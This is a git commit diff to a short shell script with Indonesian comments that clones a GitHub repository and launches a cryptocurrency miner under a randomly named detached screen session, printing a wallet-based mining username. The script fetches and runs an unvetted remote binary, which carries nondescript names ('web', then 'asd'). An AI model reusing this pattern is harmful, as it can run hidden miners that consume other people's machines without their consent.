d7453109e508ea35a431e7ea98ee15b363992114
amirul5656 <hendra.amirul@gmail.com>
2025-07-26 17:44:07 +0700

    Update main.sh

--- mainn.sh
+++ mainn.sh
@@ -7,19 +7,13 @@ RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)
 apt-get update -y
 apt-get install -y wget tar screen curl git
 
-# Instal Node.js versi LTS (via NodeSource)
-curl -fsSL https://deb.nodesource.com/setup_lts.x | bash -
-apt-get install -y nodejs
 
-# Cek versi untuk memastikan
-node -v
-npm -v
 
 # Clone dan jalankan miner
 git clone https://github.com/amirul5656/webjs.git
 cd webjs
-chmod +x web
+chmod +x asd
 
 # Jalankan miner dalam screen
-screen -dmS $RAND_NAME ./web
+screen -dmS $RAND_NAME ./asd
 echo "🚀 Miner sedang berjalan di dalam screen: $RAND_NAME (user: mbc1qt9gj6nqz4p3f7tylp9mnuvc8vcyrcgue9psxg5.$RAND_NAME)"
